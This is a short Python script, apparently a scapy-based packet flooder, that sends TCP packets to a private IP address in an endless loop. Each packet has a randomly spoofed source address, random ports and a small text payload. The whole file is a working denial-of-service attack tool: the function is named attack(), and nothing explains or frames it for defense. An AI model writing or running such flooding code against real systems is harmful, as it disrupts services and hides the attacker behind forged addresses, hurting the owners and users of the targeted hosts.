#! /usr/bin/python3
# _*_ coding: utf8 _*_

from scapy.all import *

target = "192.168.18.114"
message = "hola"

def main():
	attack()


def attack():
	count = 0
	while True:
		srcip = RandIP()
		sport = RandShort()
		dport = RandShort()

		IP_layer = IP(src=srcip,dst=target)
		TCP_layer = TCP(sport=sport,dport=dport)
		Raw_layer = Raw(load=message)
		package = IP_layer/TCP_layer/Raw_layer

		send(package,verbose=False)
		count +=1 
		print(str(srcip))


if __name__ == "__main__":
	main()
 
